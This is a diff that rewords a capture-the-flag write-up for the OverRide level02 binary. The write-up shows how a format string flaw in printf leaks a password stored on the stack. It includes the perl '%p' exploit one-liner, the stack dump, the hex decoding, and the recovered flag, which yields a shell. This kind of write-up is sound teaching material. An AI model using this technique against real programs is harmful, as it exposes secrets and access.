@@ -1,11 +1,11 @@
-1. The main opens the pass file of the level03 and store it in the stack
-2. After that, the program ask for an username and a password. Both are store in the stack.
-3. The password is compared to the content of the pass of the level03. If it isnt a match, the username is printed with additionnal text and the program ends
-4. The flaw is in the manner the username is displayed. Printf is used to display the username but it is directly the format string.
-5. So we can use a Format String Attack to read and write data arbitrary.
-6. With %p, we can print addresses in hexadecimal. As long as we use it, it will display the stack.
-7. As i mentionned earlier, the .pass file is store in the stack. So if we use enough %p, it will display enough data to display de flag.
-8. Here is the command to run the program with many %p : perl -e 'print "%p "x30' | ./level02
+1. The program opens the "pass" file for level03 and saves its contents in the stack.
+2. The user is prompted to enter a username and password, which are both stored in the stack.
+3. The program checks if the entered password matches the one in the "pass" file. If not, it prints the username with additional text and terminates.
+4. The flaw lies in how the username is displayed. The program uses the printf function without proper formatting.
+5. This allows for a Format String Attack, enabling arbitrary data reading and writing.
+6. By using the "%p" format specifier, the program can print hexadecimal addresses, revealing the stack contents.
+7. Since the ".pass" file is stored in the stack, using enough "%p" will display sufficient data to reveal the flag.
+8. To execute the program with multiple "%p" instances, use the following command: perl -e 'print "%p "x30' | ./level02
 9. And here is the result :
 
 level02@OverRide:~$ perl -e 'print "%p "x30' | ./level02
@@ -16,10 +16,10 @@ level02@OverRide:~$ perl -e 'print "%p "x30' | ./level02
 --[ Username: --[ Password: *****************************************
 0x7fffffffea10 (nil) (nil) 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffec08 0x1f7ff9a08 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d 0xfeff00 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
 
-10. If we only keep this portion : 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
-11. Convert in Big Endian and join them : 4868373452506E7551397361354A414558674E5743717A377358476E68354A354D394B6650673348
-12. Finally, we can convert these hexadecimal data to text : Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H. It look like a flag !
-13. The fun thing that i note mentionned is if we have the flag as password, the program spawn a shell. So we can confirm the win !
+10. Retaining only this portion: 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394D
+11. Convert the values to Big Endian and concatenate them: 4868373452506E7551397361354A414558674E5743717A377358476E68354A354D394B6650673348
+12. Finally, convert the resulting hexadecimal data to text: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H. It appears to be the flag!
+13. Additionally, entering the flag as the password spawns a shell, confirming the win!
 
 level02@OverRide:~$ ./level02
 ===== [ Secure Access System v1.0 ] =====
